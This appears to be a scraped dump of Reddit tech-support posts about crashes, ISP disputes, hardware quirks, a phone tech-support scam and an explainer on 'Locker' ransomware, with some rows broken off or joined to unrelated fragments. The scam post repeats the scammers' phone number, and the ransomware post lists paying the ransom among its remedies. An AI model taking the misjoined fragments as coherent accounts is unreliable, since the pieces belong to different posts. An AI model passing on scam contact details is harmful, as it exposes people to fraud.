Except I always have an error of some kind every single day. Usually it's just the Windows 10 ""blue screen"" with the sad smiley face with the accompanying error message ([Looks like this](http://thewindowsclub.thewindowsclubco.netdna-cdn.com/wp-content/uploads/2015/09/Blue-Screen-of-Death-Windows-10.png)) but sometimes I get random stuff happen after booting up. These are always minor things that never heavily affect anything, and always get fixed with a quick reset, but I still worry that this isn't something that should be happening and I want to see if there's something wrong with something and if I should get it fixed before it gets worse.

I've tried reformatting my computer, because my sister berated me when I asked if its because the hardware wasn't put together properly, telling me I probably just downloaded something suspicious, but I still get the errors.

I decided to write down each error message or errors I got in the past week and a bit to try and get help for this. 

By manually reset I mean I have to actually press the restart button on my PC, since it usually resets itself.

4aj5x1,"I bought windows online from Microsoft, how do I prove it is an authentic copy to a repair shop?","Hello,

I purchased a Windows 8.1 --since upgraded to 10-- key online from the microsoft store (I still have the info from the order) and installed using a friend's disk in January of last year.  I'm having an issue with an MBR error 1 issue (along with other minor things I wanted looked at).  When I took it in to have it looked at, the woman at the counter got really self-righteous about them ""not servicing *illegal* machines.""

   I tried to explain that I purchased the copy online and have all the subsequent proof from microsoft, but she kept insisting it was an illegally obtained copy and asked me to leave.  Since the I can't get past the MBR error, I can't do anything on the computer itself to prove authenticity.  I'm beyond frustrated right now.

44328s,"My mom let a guy access my computer remotely, what do I do now (xpost malware, xpost 24hrtechsupport)","Dear reddit I need your help in a big way, I am freaking out!! I am not the most tech savy gal around--I use my lap top (running on windows xp) just to work on word documents, excel, watch youtube, and check my email type stuff (no movie downloading). I ran malwarebytes last month and had zero threats (but my antivirus is almost certainly outdated). Yesterday my mom was using my computer while I was at work and she got hit with these huge pop ups with flashing lights/loud noise saying ""you cable company [it actually correctly identified which one] has detected a virus, call this number. do not shut your computer down"" She calls the number (18887935881), and they told her if they get disconnected to call (18887935881). She talked to someone (clearly in India) who said they were ""microsoft technicians"" that our cable company contracts with.
They had her go to the ""run"" part of the windows and type things into it so they could get access to the computer. I found her the terms they told her to run on my computer: picture attached http://imgur.com/Zb4gE5S
I didnt' work at first so they connected her to a ""supervisor"" who had her restart the computer, go to ""run"" and type things in (attached) and then he got into the computer. He went through and opened some files, showed her some things and said that our ""ISP was open"" on three episodes and we had been/or were vulnerable to an attack (after hearing this I had to remind my mom that on those dates listed we didn't have wifi, I had just used my phone intermittently as a mobile hot spot). This is a Firefox window that was open on my computer when I got home: http://i.imgur.com/loGHaft.jpg
(one of the files the guy was working on was open--i cut and pasted it into word and attached here). It was one of those black boxes that look like ""code"" and the title was ""C:\WINDOWS\system32\cmd.exe (I cut and pasted this in the same notepad document)
http://i.imgur.com/szmhDqz.jpg another picture: http://i.imgur.com/DChG0UA.jpg
He then offered for a free of 189 dollars to clean up the computer (he would need two hours on it), install antivirus, etc. She said No and then put the computer on sleep. The guy was apparently not pushy, was pretty nice. She didn't see him go into the computer's other files or download anything (though I assume he could have done so invisibly somehow).
When I heard this story from her my heart totally sank. I called my cable company who said of course it wasn't a valid number. I called the actual number again and they said it was a tech assistance line. I googled the second number above and of course there were people telling stories about getting scammed (people giving up access to their computer to them, and then the computerh having problems)--that company even has a website attached to their number ( IFIXPC247: Home)
After hearing this computer I unplugged my wifi and then ran a malwarebytes scan that showed zero threats.
Okay so what do I do!!! I am freaking out here that everything is stolen and my life is ruined.
Is it possible that they were able to lift files out of my computer without my mom noticing (i have old tax returns on there but thats the only thing with real information on it)--if so should I go get like lifelock or whatever kind of ID theft prevention?
It is possible they left a bug in the computer that will continue to upload my information and send to them? how can I check this (other than malwarebytes or is that enough? (this is why I disconnected my wifi at home to prevent something from transmitting).
Is it possible that my whole wifi at home got corrupted by them? (should I be worried about using my wifi on my home, could they have infected that somehow so they can access my phone or other electronics if I am on the wifi signal)---I realize this might sound dumb.
I have my gmail password saved on chrome, I also have a few other passwords saved (including my appartment building and car loan--both of which if you go in there and search around you might be able to get to my banking information, since I have direct deposit set up). Could this be compromised? should I be changing all my passwords?
I am hoping they just wanted to get her money and then left it at that.
What do I do next? how screwed am I? will a virus/malware scan be sufficient or do I need to strip the computer down and reinstall windows and stuff? what are the chances my identiy and information has been stolen?
I couldn't sleep all night because of this, and I had to wait to come to work to make this post. I hate the fact I am the stereotypical computer illiterate women and this has bummed me out big time.

Also, I have had a tone of issues with connecting it to the dock, in certain cases my monitors would not go on, I would have to disconnect and reconnect 10 times and in some cases actually having to restart the computer.

4091gt,"I'm faintly picking up FM radio through my laptop's docking station, and I'm curious as to why","I just got a Microsoft Surface Book, and I'm running 64-bit Windows 10 Pro v. 1511.

For the past few weeks everything has been normal, but when I came back to my university after winter break I started to hear very faint music and voices through my headphones. Even though it's barely audible, I was able to figure out what kind of music was playing, and I eventually identified it as a local jazz station (89.3 FM). A little more research showed that the station's transmitter antenna is on my school's campus.

I also figured out that I only hear the station when my headphones are plugged into the jack on the [Surface Dock](http://www.microsoftstore.com/store/msusa/en_US/pdp/productID.325725200?WT) (not the jack on the computer proper). I have a power cord, ethernet cable, wireless USB keyboard/mouse, and a monitor hooked up to the dock, but removing any of these does not stop the sound.

The sounds are faint enough to be totally undetectable when I'm playing audio from the computer; I only hear them when I'm wearing plugged-in headphones in a quiet room and there's no sound coming from my system.

I'm not bothered by the sound at all, and I don't have any reason to believe it's doing damage to anything—I'm just really curious as to what's causing it.

3xu3ug,My boss just asked me to fix the network at my job - I don't work in tech. :/,"Everyone using wireless (especially macs) in the office has been experiencing intermittent connectivity problems.

I found that (Sometimes) the problem gets fixed if you renew the DHCP lease. What is a DHCP lease? I have no idea. So I told a couple people. No big deal right?

Nope. The out-of-town boss found out and has tasked me with fixing the whole fucking thing. I told him I have no idea what I'm really doing, but that didn't help. I'm in charge of the project I guess, so I want to get it done. I'm allowed to bring in outside help but I would like to figure out the source of the problem first.

Now I know there could be a million things wrong with the network, but I was hoping I could just get some general information before I set out to find a networking guy - hopefully streamline the process and don't wind up looking like an asshat.

Details:

So, we've got maybe 100 devices connecting via a ZyXEL NWA1121-NI - wireless access point. The (repeater?) is not mounted, it just sits on a desk.

The zytel is connected via 100+ foot of cable to our small server rack, which is being run from a cisco rv110w and a ubee U10C037.

I'm not trained in networking, but I'm thinking the (repeater)? simply cant handle the full load. The wireless connection is always much slower but works some of the time, it only seems to dip during the middle of the day. I don't think it's our ISP because speed tests vary wildly from wireless and wired connections.

Any ideas you might have will be greatly appreciated.

3vkc5l,Time Warner Cable just showed up saying they traced the signal affecting 300 people to our home.,"Edit: Thanks guys. Makes sense. Although the system hasn't been touched in 2 years (when a tech installed the splitter to add her Phone modem)  I was just wondering how one house so many people. Thanks for all the responses.



My mom called and had the Time Warner Tech get on the phone with me because I wired her new addition.  This addition was wired 5 years ago.

Two techs came to my mom's house, and said that over 300 people were without cable/internet and that they had traced the signal to her house.  Nothing has changed at her house.  She has always had problems with her internet going out, but her cable tv would stay on.  The only thing that has changed since I wired it all 5 years ago is she changed to internet phone about 2 years ago.

When she changed over tot he full Time warner package (Phone/internet/tv) the tech came out, and put a splitter under the desk and added the phone modem.

The tech got on the phone with me, I told him there were no hidden splitters under the house and the only splitter was under the desk that their guy had installed 2 years prior. He said ok and hung up on me.

When I called my mom back, she said they said they had found the problem, that it was a splitter under the desk (?) (what?)


She said that her signal was affecting the whole neighborhood and that also it could affect phones in New York. (We live in South Carolina).

This all sounded a bit strange. I asked her was she sure it wasnt someone casing the joint.  My nephews said they were in a Time Warner van, and they had the clothes, so they must be legit.

Does anyone have any idea if something like this is possible.  Just out of the blue? Her cabling hasn't been touched in two years since they added a splitter to install the phone modem.

Also. I do want to add this, but it is totally unrelated. About a month ago, a Time warner guy came to my door. I opened and he just stood there. I finally said, can I help you.  He said yeah, you had an appointment? I said no. 
I asked him what address he was looking for? He didn't answer. He asked me what my address was. i told him and asked him again what address he was looking for, but he just said, ""I guess I have the wrong house."" and left.

Odd. The next day, I was leaving for work, and I noticed the cover of my cable box lying on the ground a few feet from the actual box.  I tried to put it back on, but the bolt thing was missing so the cover won't stay on now. I'm pretty sure that guy had to have messed with it. Anyway, thats no big deal.

3udzsu,MSI laptop has a sticker that states void if removed. I can't upgrade the ram without removing the sticker. MSI support gave me a strange response,"A main reason I purchased the MSI laptop was that it came with a two year and three month warranty, such confidence in the product suggests a good build quality.

However as stated in the title I can't access the ram or harddrive to upgrade them without voiding the warranty according to a sticker covering one of the screws. It doesn't have a separate partition like other laptops, I must actually open the entire laptop and destroy the sticker (Warranty Sticker. Void if tampered). It's a MSI ge72 2qd apache pro.

I contacted MSI support and I thought their response was strange:

""Removing warranty sticker and mount SSD inside of your computer doesn't change anything in case of warranty rules for other components. MSI users are allowed to void the warranty sticker to upgrade RAM, HDD and also for cleaning purposes. However, please note that any hypothetical  damages which may occur during mentioned actions will not be covered under manufacturer's warranty ( for eg. Scratches, broken pieces, damaged pins etc.)
Kind regards,
UK Notebook &amp; AIO Customer Service""

This appeared at first to state I could go ahead, and that the sticker is a false warning (then why have it at all?). However I asked for clarification about the ""hypothetical damages"" as obviously I wouldn't intentionally damage my laptop and wondered that if the internal parts naturally failed could this mean they could say this hypothetically happened because I peeled off the sticker, thus also voiding my warranty? This was the clarification I received:

""Dear Sir,
Please note that you are allowed to proceed with upgrades but without causung damages to the internal parts of the unit.""

Again, just saying the same thing. I think it's unnecessary to add the last bit as obviously part of the terms of a warranty is that you can't damage the laptop yourself. To me it seems I would get myself into a *sticky* situation by upgrading the ram as they could claim that if a the processor failed for example it was as a result of my tampering.

I want to be certain about this as I spent a lot of money on the laptop and purchased it because of the warranty, am I being unreasonable and it's stated clear as day that I can upgrade the ram without voiding my warranty?",https://www.reddit.com/r/techsupport/comments/3udzsu/msi_laptop_has_a_sticker_that_states_void_if/,1448570472.0,60,0.88,58,techsupport,jackwoodson

-Safe Mode with command prompt: Tried typing ""Start msonfig"" to see if i could access it from safe mode but it gives me this error: ""Windows connot find 'msconfig'. Make sure you typed the name correctly, and then try again.""

-Booting it up with the installation disk: The last restore date is way back in 2014 and I would lose to many files to do this. If possible I would really like to not clean install windows

Thanks in advance for your help

Update:
To clarify, I have tried running in safe mode, in safe mode with command prompt and in normal mode and none of them work. All of them just give me a black screen upon startup with my mouse.
When booting it normally, I can move the mouse around but that is all I can do.
When booting it in any of the safe modes, the cursor is larger but is stuck to the middle of the screen.
TO CLARIFY: The only way I have of getting to any options is through the windows 7 installation CD. I cannot even get to the command prompt without it.
Currently booting windows up again through the CD and will try to run another system restore, hopefully this one will work.

3mc2w0,Help! My mom fell for a scam,"This morning on her ipad, my mom got one of those popups saying something was wrong and to call a number. She called it and they got her to go onto her desktop, go to a specific website, and she says they had her delete something. After a couple minutes she says they had remote access as she could see the cursor moving on its own.  They then said that they would need about 30 minutes and there would be a charge. As soon as she heard that, she (thankfully) said no thanks, and hung up. About 30 minutes after hanging up, she decided to change the computer's password and unplug the thing. Ten minutes after that she woke me up and told me what happened.  The bank accounts haven't been touched yet, we called the bank to let them know, and our plan is to take the computer to microcenter.

3k6145,I just got a 980 TI and I am a bit confused.,"Hello, I just recieved my TI. After testing it out for a bit I am kinda disappointed and I feel something is not 100% right.

I included my 3dmark benchmark score for easier: http://www.3dmark.com/3dm/8506861

I tested Witcher 3. With all ultra- all hairworking and vsync was off. I was top around 65+ fps, while looking out on huge mountains it dropped to under 60.

In Rocket League (this might just be beacuse it locks at a certain fps) I was kinda expecing the fps to be in the 3 digits. It's at 65.

In World of Warcraft I couldn't run all on ultra. I would be on 40-50 fps, and to be on a stable+ I had to use high/ultra settings. 

I was kinda expecting to be able to run WoW on ultra without issues. My specs are in the 3dmark, but if you can't click:

Intel Core i7-4770

NVIDIA GeForce GTX 980 Ti

Operating system: 64-bit Windows 8.1 (6.3.9600)

Motherboard MSI B85M-G43: (MS-7823)

Memory: 16 384 MB

Score: 13477

People with exact same GPU and Graphics card had aroundt 15000 on their score. I don't know how numbers work as I haven't gotten into benchmarking yet, but it seems to be quite a difference.

Why I am worried is simply because with my old graphics card as well people told me that I should have been able to run everything on higher graphics even though I couldn't. My friend who has a Gtx 980 (but a slightly better CPU then me) can run WoW at ultra.

I am getting a bit worried that there might be something wrong with my PC and I am really eager to troubleshoot this as I wan't max performance out of it naturally.

Any help VERY much appreciated!

EDIT: I'M SMILING FROM EAR TO EAR. My problem was ALL these years I have had my GPU plugged into the 2.0 PCI port. (I ordered my PC pre-built, so I am showing a huge finger to komplett for putting my card in 2.0 instead of 3.0 in the first place!) which is the reason behind me running lower graphics then what my card really could handle.

Same issue with my new 980 TI. I plugged it into the 3.0 port and watched my FPS sky-rocket! I can now run Wow ALL max settings at 90fps in towns, and it's beautiful. I haven't tested Witcher 3 yet but I expect same results. My 3d benchmark went from 13477 to 14400! I'm so happy now and I thank ALL of you that was trying to help me out, and of course, especially those who helped me with the PCI ports.

3gdni4,Strange bug involving magic wand and Windows 10... Honestly at a loss as to how these two things correlate...,"So, some strange fucking bug with Windows 10 is making ""USB disconnected/connected"" noises every 1-5 seconds every time I turn my hitachi magic wand on. It will also bring up the file explorer unless I eject the USB... Then, just the sound continues on every 1-5 seconds until the second I turn the wand off. My computer is plugged into a completely different outlet than my wand.. I don't even understand how these things correlate. I am so confused and agitated. I didn't have this problem prior to the Windows 10 update. Help! Here's a [video](https://youtu.be/dXZZf3EhuDo) of what happens when I turn my wand on... It's only the first 10 or so seconds.. I accidentally rendered it incorrectly.

Um, obligatory PC specs: 16GB RAM, Nvidia GeForce GTX970 4GB GDDR5, Intel core i7-4770 processor, 450M? Corsair power supply, 3TB HHD, 250GB Samsung SSD. (Is that it?)

I've tried ejecting the USB. Turning my computer off and on doesn't fix it. Turning my sound off works, but I shouldn't have to do that.. And I can't go in any other rooms with my wand.

Edit: Tried it in every outlet in my room... Same results. Yet, this strange issue does not happen on another Windows 10 computer in the same room. Tried it in a completely different room and there was no noise.. Came back in my room and put the thing in a foil bag, then turned it on.... NO NOISE! CAN YOU BELIEVE THAT!? So I need a faraday cage over my computer to masturbate in peace? What in the actual fuck? Lmao.

**FINAL? EDIT: I have two USB ports on the front of my case. My left one had the thumb drive which kept popping up when the wand turned on and the right one had an Xbox controller plugged in. I unplugged both, switched them, and now the problem is gone. WHAT!? [Fuckin' magnets, how do they work!?](https://youtu.be/OvmvxAcT_Yc)**

3ffhkz,"Choppy audio in Google Chrome after upgrading to Windows 10. Just fixed the problem, want to document here for future users.","Hi All,

I just upgraded to Windows 10 last night. Everything went great, except all media in Google Chrome (YouTube, Pandora, HTML5, etc) has choppy, glitchy sounding audio. I spent hours trying to debug this problem. Many users suggest disabling the built in Flash player in Chrome://Plugins, however, this did not work for me.

The fix ended up being simple. I had to add the argument --audio-buffer-size=2048 to the Chrome launch shortcut.

You do this by right-clicking your Chrome shortcut. Then select 'Properties'. In the 'Target' field, you should see the path to your Chrome executable. (Similar to ""C:\Users\UserName\AppData\Local\Google\Chrome SxS\Application\chrome.exe"")

Paste this text AFTER the closing quotation marks at the end of the path:  --audio-buffer-size=2048

Your 'Target' field should now look like this (""C:\Users\UserName\AppData\Local\Google\Chrome SxS\Application\chrome.exe"" --audio-buffer-size=2048)

This should fix any audio stuttering in Chrome!

**EDIT:**

If this fix doesn't work for you, or you are having a similar issue in different application (League of Legends, Steam, etc.) there is another possible fix. You will need to adjust the bitrate of your audio playback device. To do this, follow these steps:

Right-click the speaker icon in you taskbar (next to the clock) and select 'Playback Devices'.

Find your default playback device. It should be the one with the green checkmark by it. You can right-click this device and click 'Test' to ensure it is the right one. Right-click this device and select 'Properties'.

A 'Speakers Properties' window should now pop up. You want to click on the 'Advanced' tab in this window.

In the 'Advanced' tab, there is a 'Default Format' section. In this section is a dropdown box for your bitrate. The options in here look something like '16 bit, 48000hz (DVD Quality)'. Try out each and every option in this drop-down menu. This changes the playback quality of your audio, but may correct the issue we are seeing. Be sure to click 'Apply' after making a change, and then restart the application you are having audio problems with.

Be sure to report back if this fix works for you, and what setting you chose!

EDIT 2 (8/16/15):

Hi all,
I've still had intermittent problems over the last few weeks. I tried running Google Chrome Canary (the dev version of Chrome with the latest updates). No change at first, but this morning I had a Chrome update that seems to have resolved all problems... Not sure what changed, but I no longer need the command line fixes, and all audio is working great. May have been a Window's update, or the Chrome update.

3eod38,"Covering A Whole Small Town With Free Wi-Fi. Need Some Technical Advice. (Cross-Post, r/networking)","I am in the process of bonding together multiple ADSL, Cable, and 3G/4G connections to create a single ultra high bandwidth connection using a TP-Link load balancing ethernet router.
That is part one of my project, and is well underway.

Part two is unchartered territory for me, however. Once I've successfully bonded together the connections to create a single ultra high bandwidth connection, I want give away that connection to the beautiful Costa Rican seaside community that I live in to everybody for free.

Basically, I need to take the bonded connections from the TP-Link Load Balancing ethernet router, and broadcast a single high powered wifi SSID 1 kilometer in every direction. I have no idea how to approach that, but basically I'm looking to DIY a campus style large area Wi-Fi network available to everybody for free.

Will I need to chain together multiple range extending wifi repeaters? That would be expensive and in my experiments with this method found that it often results in bandwidth loss, due to various IP and DHCP conflicts (I think).

Or, would it not be more efficient (and less expensive) to broadcast from a single high powered omnidirectional rooftop wifi antennae? And if so what model could I obtain that would be able to achieve the specific aims of my network (1km, public network)?

I have a year to pull this off before I go to law school, which should be plenty of time.

3e98f6,AT&amp;T Internet Reduced Speeds 100x After 30 Day Trial Period,"Last month I switched from Comcast to AT&amp;T for internet. I paid for 60mbps on Comcast, and got a consistent 50mbps, with 30 in busy hours. I switched because they imposed a 300gb data cap with no other options, which ran my bill up from $116 per month to between $250 and $300 dollars. Ridiculous? I agree. (I'm also currently disputing with them that it's impossible that I could have used so much data, since one of those months it was said I went over I actually had their services disconnected.)

So I switched to AT&amp;T. In my area of Atlanta, they actually say they can provide 75mbps down. I said fine, and tried it out for a month. I kept the Comcast equipment, though it was disconnected because I wanted to be sure AT&amp;T were being truthful about their speeds. (This was the month I'm disputing Comcast about.) Surely enough, the speeds were very high. Sometimes they dipped down to 30mbps, but typically they were between 65 and 70mbps. I use speedof.me, and I've checked these speeds against some other speed tests.

Fast forward to this month, almost immediately after the 30 day trial was over. I start noticing that my Netflix is pixelated and has to stop to buffer, some websites take minutes to load, I have to lower the youtube quality to 480p for it not to buffer endlessly, and my ping goes from 1-3ms to 180-1500ms. Yes, I have had my ping be greater than one second on Civ. I checked my speed and sure enough, it ranges from 300kbps to 3mbps down consistently. That's over the course of the past 2 weeks. It's really frustrating. I have tried resetting my router, hardwiring through ethernet, resetting the modem, everything. Nothing has increased my speed.

I guess I'm writing to ask if there are any people out there that have had this issue, or what to do about it. If anybody knows of a reset that will actually fix the system, I'd love to hear about it. If not, and it is a devious operation on AT&amp;T's end, then please help me figure out what on earth to do about it.

3e4rxu,"Adblock Plus is blocking hundres, sometimes thousands, of ads at a time. Do I have a virus?","This problem started a few weeks ago. I was trying to watch a movie on hbogo (a site I frequent) and it was very slow and kept pausing every minute. I minimized the screen and noticed that ABP had *thousands* of ads blocked and the counter was still climbing. I close down Chrome and then noticed the weirdest thing; hundreds of my pictures were scattered on my homescreen. I took care of that quickly and decided to focus on the ads, as now all sites I visit keep the ABP counter running at a much faster pace than usual. Some sites that only ever got a couple of ads blocked are at double digits now. From what I've found online, most of the pop up ads viruses actually pop up on your screen, this isn't my problem. So I cleaned up my hp laptop (running windows 7) with adwcleaner, then checked it with malwarebytes, and finished by scanning with bitdefender free. Nothing was found. But the problem persists. Did I miss a step? Is there a new virus out there that is hard to root out? Please help. I can't afford geeksquad and I would really like to resolve this on my own. Thanks for taking the time to read.

EDIT: I did what /u/jmnugent suggested, as it seemed to be the best advice. The program found 2 ""trojans"" that were ""probably harmless"" but I could only kill one process. The ""user notification service"" by Intel wouldn't allow me access to kill the process. Many of the results say ""the system cannot find the file specified"". And I'm still seeing big numbers on ABP. ...sigh... Thank you all so much for your feedback. If you can think of something else, I would really appreciate it. Also, has no one else had this happen to them? I can't be the only one going through this... Can I?

EDIT, PART 2: Thanks again for all your comments. I haven't done anything else because the advice has been mixed. For example, the ublock thing got downvoted so I didn't get rid of ABP. Especially since, as I said earlier, this problem is new. I like ABP. I want to try to fix this. One user mentioned that it's normal for hbogo to have so many pop up ads, but I don't agree. I have used that site for years and this never happened. Also, it's on all sites now. Even utility sites, like the gas and electric companies where I pay my bills. That is completely new.

EDIT, THE THIRD: I was out of town for a few days and away from the laptop. I'm back now. I've installed Kaspersky Total Security. Just finished a full scan plus rootkit scan: NO THREATS FOUND.

3d4mb0,Best path to becoming an IT professional?,"Let me start off by saying that if there's a better place to have this discussion, I'm happy to move there.  I just figured that with the concentrated number of tech support folks in this sub, this would be the best place to ask.

I'm currently working in a job I absolutely cannot stand installing satellite TV and internet.  The technology is cool, but it's 80-hour work weeks and I'm lucky if I get a single day off a week.  I'd always fantasized about a career in IT, but having this job has given me the motivation to get my stuff together so I can get out of this career.

I've been taking Professor Messer's A+ certification courses in preparation for taking the A+ exams.  I know that's the first step I need to be taking in order to even have a chance at getting hired somewhere in an IT-related position.  My questions to all of you are:

*If I'm trying to get hired someplace (like a hospital, large office, etc.) in a helpdesk or IT role, what other certifications should I bring to the table to maximize the likelihood of me getting hired?

*The CompTIA certifications are really expensive, especially considering how little I'm being paid at this job.  I've seen some discount sites - are there any tips or sites I should know about?

*For those of you who have worked in this industry before, how important is experience in the field when you're hiring?  Like I said, I've got some experience with low-voltage wiring because of this job, but I've never officially worked at a place doing IT (I did used to work at RadioShack, but that's the closest I have).  I just don't want to go into someplace that expects 5 years of IT work with only some certifications if that's going to get me laughed out of the building.  Are the certs enough to show that I know what I'm talking about, or should I try to find a job fixing computers somewhere for a while first?

If people who are knowledgeable about this industry wouldn't mind imparting some wisdom, I'd really, really appreciate it.  Thanks.",https://www.reddit.com/r/techsupport/comments/3d4mb0/best_path_to_becoming_an_it_professional/,1436796591.0,92,0.97,71,techsupport,DavisJ3608

With the success of the [anti-malware](http://www.reddit.com/r/techsupport/comments/33evdi/suggested_reading_official_malware_removal_guide) guide, I believe we should work toward producing a series of guides. 

I feel the logical place to start would be on helping people *before* shit hits the fan, with a guide on **preemptive computer care**. Hardware maintenance, protective/security software, backups and updates. Everything that will increase the longevity of a computer system and decrease the amount of effort and risk involved in operating one.


Collectively we have thousands of years of experience and training, so we're in a unique position to do something beautiful.


You all have your own personal do's and don'ts for owning and operating computers. It's part of what makes /r/techsupport special. Some things are straight forward, others seem counter-intuitive, and some are so original and creative that it would simply be a shame not to share them.

I ask that you list whatever you have, with as much detail as you can. If someone has already mentioned something similar, comment below theirs to add any more detail you might have.

This will be organized into an easy to read document as well as the wiki, so don't worry about notes or fragments of ideas.

3cj3dt,"Comcast said they would refund me, but they're practically refusing to.","I've explained this while situation a million times to countless representatives before and I'm getting tired of telling the story. I'll try to make it quick.

I canceled my internet service through Xfinity back in February. They had already charged me for March and April, so at $30 a month plus tax, they owed me $64 and some change. They canceled the service no problem, but I have yet to receive the money. They said they would send me a check in the mail and it would take 2-3 weeks. No problem, I wasn't in any rush.

I gave it a month and called back. They said they would reissue the check, and to give it. Another 2-3 weeks. Still nothing. I called back and they said that they can reissue it again, except this time, I wanted to change the address to which it was sent, just in case that was the problem. They said that they can't send it to a different address because it has to go to the same place where the service was.

Before I go any further, let me just point out that I had no problem getting mail before. I was able to get the advertisements from comcast/xfinity and the bills as well. Just not the money they owed me.

They told me the only thing they could do was to reissue it again. 2-3 weeks.

Finally, I get on chat because I'm sick of calling them. If you've ever called Comcast support, you know it takes at least 45 minutes for even the smallest of questions.

I took screenshots of the last couple interactions with them through chat:
http://imgur.com/UdQzQ4U

http://imgur.com/OeDBTq9

As you can see, they have assured me that everything is all good. I don't care when my money comes as long as it does.

At this point, I was seriously upset about still not having the check so I called again. I explained how I was getting really tired of dealing with this issue, and just want my 64 dollars.

That's when they made me feel much better. The lady told me that they will pass it to someone higher up to deal with my issue. She said she was going to send an email to her supervisor and have him call me within the week.

No call after a week and a half. So I call again and the lady says that there was no request under my account to have someone higher up deal with the issue.

She also says that it has been too long since I have closed my account and that they can no longer view any proof on their end that they had charged me for the extra 2 months, so they're not likely able to refund me.

Thankfully, she said that she will put in the request anyway. So she said the same thing as the last lady; that she will email her supervisor and have him call me in 24-72 hours.

It's been just over a week now and still no call. I just want the check. How hard can that be?

TL;DR
Comcast charged me for the 2 months after I canceled my internet service and said they will mail me the check for the 2 months. They keep postponing the check until they can say that it has been to long since closing the account to request a refund. I'm pissed.

Hello Reddit,

Recently my nephew accidentally formatted my sisters external hard drive by plugging it into the Xbox 360, he has wiped everything off and I don't know how to recover it, if it is even recoverable.

I tried two quick scans on Recuva and EaseUS but both returned nothing. I'm currently running the recuva deep scan but i'm not sure if it will find anything, i've heard that the format might have zeroed(?) the hard drive, though i'm not entirely sure on that.

We haven't used the hard drive since it was formatted, everything has stayed the same as far as i'm aware. The only thing I have done is plugged it into a different computer (mine) and tried to recover the data.

We would be willing to go to professionals but would prefer it if we could sort it out at home due to the professional services apparently being very expensive.

Any help is very much appreciated as my sister could lose all her uni work and her job placement if we can't recover it.

Thanks for reading.

EDIT: I have just learned that the Xbox reformatted the ex HDD to Fat 32 from NTFS, is that anything to do with it?

EDIT2: **I just realised that i'm an idiot for not including this, I worded it poorly. When I tried running the scan on the external hard drive instead of showing me the lost files from the old partition it showed me the current files from the Fat 32 partition, does this mean if I reformat it to NTFS and run the software it can recover the data? I can try it on a clone first if it's possible**

3c4joe,"Graphics card malfunctioned, weird carnival music.","Hey guys, not entirely sure if this is the right place to post this, but here goes anyway. I was on my PC last night, which I had mistakenly left on for most of the day (not a normal occurrence) and right before bed I believe my graphics card malfunctioned (gigabyte HD7950) as the screen went black for a second then came back on all pixelated and when i moved the mouse it seemed to leave trails and such. Then the screen went black again, and odd carnival like music started playing through my speakers. I ran a virus/registry check and it came back clean. Does anybody have any idea what happened?

3a3k6j,"Vizio TV won't stop ""searching for available updates""","So, about 20 or 30 minutes ago, in the middle of streaming something from my computer, my 32"" E-series Vizio smart TV began ""searching for available updates"" and then ""loading"" and then starting over again seconds later, repeating on a loop without end. The video continued to play for a few minutes, but eventually stopped. The ""searching"" has not stopped. I've turned it off and on, restarted the modem/router, and looked through the TV's settings trying to find a way to turn off automatic updates to no avail. 

I'm at a loss here, and my TV is now completely worthless whenever it's connected to the internet. The searching constantly interrupts everything that I'm doing, even just going into the menu. Even if I could get an app running the ""searching"" bar constantly popping up on the bottom of the screen makes watching anything insufferable.

Anyone experienced this problem before or have an idea what might be happening? 


edit: Not sure what the status is on this issue, or if people are still coming across it, but I figured I should include some of the fixes that have cropped up since this post is coming up in google searches and what not.

For those using wireless connection: Go into Menu &gt; Network &gt; WPS. Once your television begins the WPS connection process, cancel out of it. This disconnects you from the network. Now reconnect to your network of choice (you will have to retype your password). This should stop the searching. It worked for me and many others.

For those using wired connection: Haven't used this myself, but others have reported success. Unplug the ethernet cable from your tv, then attempt to connect to a wireless network and cancel out of it. Now reconnect the ethernet cable. That should be it.

373wk0,Locker virus similar to Cryptolocker,"This thread has gotten a lot of posts asking about what the virus actually is, how can I detect or remedy it and so on. As such, I've decided to write a less story-like explanation here to clear things up.

#Description
Update: Most detailed description and analysis on this forum (http://www.bleepingcomputer.com/forums/t/577313/locker-ransomware-hides-until-midnight-on-may-25th-and-then-encrypts-your-data/)    


The Locker virus version X.XX (it takes on a random number with 2 decimal places) is represented in this picture (http://imgur.com/yjgseor). It is a ransomware that encrypts picture and Microsoft Office files, although it does not cover all extensions (for example, .jpg will be encrypted but .JPG will not). 

The virus is known to be on a fuse, so any file downloaded within the past week/month could be a likely culprit. As it stands, there seem to be trends in users of Chrome, TeamExtreme cracked Minecraft, and sports streaming sites, although **none have been truly confirmed**.

It first activated at 25/5, **midnight by the local clock**. It is not known if it's configured to only trigger on 25/5 yet. A service called **ldr.exe** and a program called **rkcl.exe** will run promptly at midnight, which will encrypt the files and lock them. The program will then pop up informing the user they have 72 hours to make a 0.1BTC payment to save their files.

The ransomware is also known to disable certain system features like system restore, delete shadow copies, and prevent the uninstalling of software. This makes it incredibly difficult to remove it or roll back to solve the issue.

#Detection
If you are unsure of whether you have the Locker virus, check the **ProgramData** folder (Default: C\ProgramData). The ransomware is known to create the folders **rkcl, tor, steg, and Digger**. steg is known to be created prior to activation and is probably the best bet for detection.

If you think you might have been infected already, browse through your documents and sort by recently modified, any file that has been modified at midnight (or a bunch of files all modified at the same time) should set off a red flag. Open these files to check for encryption/corruption.

#Prevention
If you suspect you have the Locker virus, your best bet is to immediately make a **manual backup** of your files through an external hard drive. Cloud backups work too, although you should turn off the sync function to prevent the corrupted files from replacing the good ones, should the infection happen.

#Solution
Update: As anti-malware software updates, it might be possible to remove the infection using something like Malwarebytes. Removing the infection **does not decrypt the files** though. I will continue monitoring the situation.

Unfortunately, in a similar line to most Cryptoblocker ransomware, there is no surefire way of being able to remove the infection and reverse the encryption effect. Here are some solutions you can try:

1. Use an anti-malware software such as Malwarebytes to attempt to remove the ransomware.
2. Nuke and pave. Reformat your hard drive and reinstall Windows. This is a surefire way to get rid of the trojan. Once Windows is reinstalled, restore your manual backup.    
3. Pay the ransom. At least one confirmed case of decryption after payment, but do not take it as a 100% guarantee. Still an option if you have very important files you wish to save, and no backups.
4. Use a program like Shadow Explorer or Torrent Unlocker to try to restore your files. However, the ransomware is known to delete shadow copies, so this option has been used with limited success.
5. Do option 2 but save the encrypted files somewhere in the hope that someone will create a tool to decrypt them, but this is also unlikely.
    
#Last Words
**TL;DR**: new ransomware virus (rkcl.exe) activates at 25/5 midnight like cinderella, sits in the programdata folder and encrypts your documents and images and demands payment. best current solution is to wipe and reinstall windows, and restore from manual backup.

I will be continuing to update this thread with developments on probable causes and solutions. Hope this helps, and thanks to the community for your contributions.

#Original Post
